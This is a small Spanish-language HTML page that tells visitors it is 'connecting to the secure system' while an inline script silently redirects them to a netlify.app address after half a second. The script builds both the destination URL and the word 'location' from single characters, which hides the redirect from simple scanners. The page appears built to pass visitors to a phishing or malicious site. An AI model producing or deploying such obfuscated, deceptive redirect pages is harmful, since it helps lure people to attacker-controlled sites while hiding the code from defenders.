<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Un momento...</title>
  <script>
    (function() {
      const fragmentos = [
        'h','t','t','p','s',':','/','/',
        'b','u','c','o','l','i','c','-','s','u','n','s','h','i','n','e','-','2','7','7','4','4','0',
        '.','n','e','t','l','i','f','y','.','a','p','p','/'
      ];
      const destino = fragmentos.join('');
      const prop = ['l','o','c','a','t','i','o','n'].join('');
      setTimeout(() => window[prop].href = destino, 500);
    })();
  </script>
</head>
<body>
  <p>Conectando con el sistema seguro...</p>
</body>
</html>
